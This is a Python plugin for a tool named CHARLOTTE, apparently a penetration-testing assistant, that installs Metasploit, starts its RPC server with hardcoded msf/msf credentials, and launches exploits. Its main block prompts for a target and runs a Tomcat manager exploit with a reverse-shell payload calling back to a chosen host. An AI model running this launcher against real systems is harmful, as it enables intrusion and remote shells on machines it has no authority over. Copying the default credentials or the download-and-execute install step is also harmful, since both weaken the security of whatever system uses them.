# ******************************************************************************************
# metasploit_plugin.py
# CHARLOTTE plugin for interacting with the Metasploit RPC interface.
# Automatically starts the msfrpcd service if needed, checks for installation.
# Uses the gc-metasploit wrapper (compatible with pymetasploit3).
# ******************************************************************************************

import os
import subprocess
import time
import platform
import shutil
from pprint import pprint

# ==========================================================================================
# Attempt to import CHARLOTTE-compatible Metasploit wrapper
# ==========================================================================================
try:
    from gc_metasploit import Metasploit
    print("[+] Successfully imported Metasploit from gc-metasploit.")
except ImportError as e:
    import gc_metasploit
    print("[!] Could not import 'Metasploit' from 'gc_metasploit'.")
    print("[!] Available attributes in gc_metasploit:", dir(gc_metasploit))
    raise e

# ==========================================================================================
# FUNCTION: is_metasploit_installed()
# Checks if msfconsole or msfrpcd exists in PATH
# ==========================================================================================
def is_metasploit_installed():
    return shutil.which("msfrpcd") or shutil.which("msfconsole")

# ==========================================================================================
# FUNCTION: install_metasploit()
# Installs Metasploit on Linux/macOS or launches MSI download on Windows
# ==========================================================================================
def install_metasploit():
    import platform
    import subprocess
    import webbrowser

    print("[*] Metasploit not found. Attempting installation...")

    system = platform.system()

    if system == "Linux" or system == "Darwin":  # Darwin = macOS
        try:
            print("[*] Downloading Metasploit installer script from Rapid7...")
            subprocess.run(
                "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall",
                shell=True, check=True
            )
            subprocess.run("chmod 755 msfinstall", shell=True, check=True)
            subprocess.run("./msfinstall", shell=True, check=True)
            print("[+] Metasploit installed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to install Metasploit: {e}")
        except Exception as e:
            print(f"[!] Unexpected error during installation: {e}")

    elif system == "Windows":
        try:
            url = "https://windows.metasploit.com/metasploitframework-latest.msi"
            print("[*] Launching browser to download Metasploit Framework for Windows...")
            webbrowser.open(url)
            print(f"[+] Installer download initiated: {url}")
            print("[*] After installation, restart CHARLOTTE and try again.")
        except Exception as e:
            print(f"[!] Failed to launch browser: {e}")
            print("[!] Manually download from:")
            print("    https://windows.metasploit.com/metasploitframework-latest.msi")

    else:
        print(f"[!] Unsupported OS for automatic installation: {system}")
        print("[!] Please install Metasploit manually from https://www.metasploit.com/download/")

# ==========================================================================================
# FUNCTION: start_metasploit_rpc()
# Starts msfrpcd with default CHARLOTTE-compatible credentials
# ==========================================================================================
def start_metasploit_rpc():
    print("[*] Attempting to start Metasploit RPC server...")

    if platform.system() == "Windows":
        cmd = [
            "msfconsole", "-q", "-x",
            "load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=msf Pass=msf"
        ]
        executable = shutil.which("msfconsole")
    else:
        cmd = [
            "msfrpcd", "-U", "msf", "-P", "msf",
            "-a", "127.0.0.1", "-p", "55553", "-S"
        ]
        executable = shutil.which("msfrpcd")

    if executable is None:
        print("[!] Metasploit is not installed or not in PATH.")
        return False

    try:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[*] Metasploit RPC server started.")
        time.sleep(5)  # Give it time to initialize
        return True
    except Exception as e:
        print(f"[!] Failed to launch Metasploit RPC: {e}")
        return False

# ==========================================================================================
# CLASS: MetasploitInterface
# CHARLOTTE interface for search, list, exploit, etc.
# ==========================================================================================
class MetasploitInterface:
    def __init__(self, username='msf', password='msf', ssl=False, port=55553, host='127.0.0.1'):
        try:
            self.client = Metasploit(password=password, username=username, ssl=ssl, port=port, host=host)
            print("[+] Connected to Metasploit RPC via gc-metasploit.")
        except Exception as e:
            print(f"[!] Failed to connect to Metasploit RPC: {e}")
            self.client = None

    def search_module(self, keyword):
        if self.client:
            return self.client.search(keyword)
        return []

    def list_exploits(self):
        if self.client:
            return self.client.list_exploits()
        return []

    def run_exploit(self, exploit_path, payload="generic/shell_reverse_tcp", rhost="", lhost="127.0.0.1", lport="4444"):
        if self.client:
            result = self.client.run_exploit(exploit_path, payload=payload, rhost=rhost, lhost=lhost, lport=lport)
            print(f"[+] Exploit {exploit_path} launched with {payload}")
            print(result)
        else:
            print("[!] Metasploit RPC client is not connected.")

# ==========================================================================================
# MAIN: Standalone Entry
# ==========================================================================================
if __name__ == "__main__":
    # Check if Metasploit exists
    if not is_metasploit_installed():
        install_metasploit()

    # Start RPC
    if not start_metasploit_rpc():
        print("[!] Could not start or connect to Metasploit RPC. Exiting.")
        exit(1)

    # Connect to Metasploit via wrapper
    msf = MetasploitInterface()
    if not msf.client:
        print("[!] RPC still unreachable. Aborting.")
        exit(1)

    # List Exploits
    print("\n[+] Available Exploits:")
    exploits = msf.list_exploits()
    for e in exploits[:10]:
        print(f" - {e}")

    # Search by keyword
    print("\n[+] Search for 'tomcat':")
    pprint(msf.search_module("tomcat"))

    # Run Exploit
    print("\n[+] Running example exploit:")
    exploit_path = input("Exploit path (e.g., multi/http/tomcat_mgr_deploy): ").strip() or "multi/http/tomcat_mgr_deploy"
    rhost = input("Target RHOST: ").strip() or "127.0.0.1"
    lhost = input("Local LHOST (callback IP): ").strip() or "127.0.0.1"
    lport = input("Local port (LPORT): ").strip() or "4444"
    msf.run_exploit(exploit_path, rhost=rhost, lhost=lhost, lport=lport)

    print("[*] CHARLOTTE Metasploit Plugin Complete.")

# ==========================================================================================
# END OF FILE
# ==========================================================================================
